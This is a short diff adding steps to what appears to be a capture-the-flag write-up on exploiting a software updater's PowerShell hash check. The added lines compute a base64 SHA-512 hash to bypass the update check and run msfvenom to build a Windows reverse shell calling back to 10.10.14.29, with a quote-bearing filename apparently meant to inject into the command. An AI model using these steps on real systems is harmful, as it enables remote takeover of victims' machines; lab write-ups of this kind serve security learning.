@@ -220,6 +220,16 @@ execFile("powershell.exe", ["-NoProfile", "-NonInteractive",
   { timeout: 20 * 1000 }, (error, stdout, stderr) => {
 ```
 
+we can use 
+```bash
+shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64
+```
+to bypass the check
+SO 
+1. Create the payload
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2121 -f exe -o "Po77'.exe"
+```
 ### Exploitation
 
 Step-by-step exploitation.
